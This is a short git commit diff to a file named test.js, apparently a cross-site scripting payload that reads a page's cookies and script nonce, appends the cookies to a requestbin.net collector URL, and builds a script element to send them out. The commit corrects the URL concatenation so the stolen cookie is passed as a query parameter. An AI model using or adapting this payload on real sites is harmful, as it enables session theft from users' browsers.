5206552e311bca3e0f467abe4459799b6a8c7841
achahbi <chahbi.abderrahmane@gmail.com>
2020-04-18 15:01:46 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,7 +1,7 @@
 var payload = document.cookie;
 var nonce = document.querySelector("script").nonce;
 
-var src = 'http://requestbin.net/r/1ozflha1${payload}'
+var src = 'http://requestbin.net/r/1ozflha1?exp='+payload;
 
 var s = document.createElement('script')
 s.type = 'text/javascript'
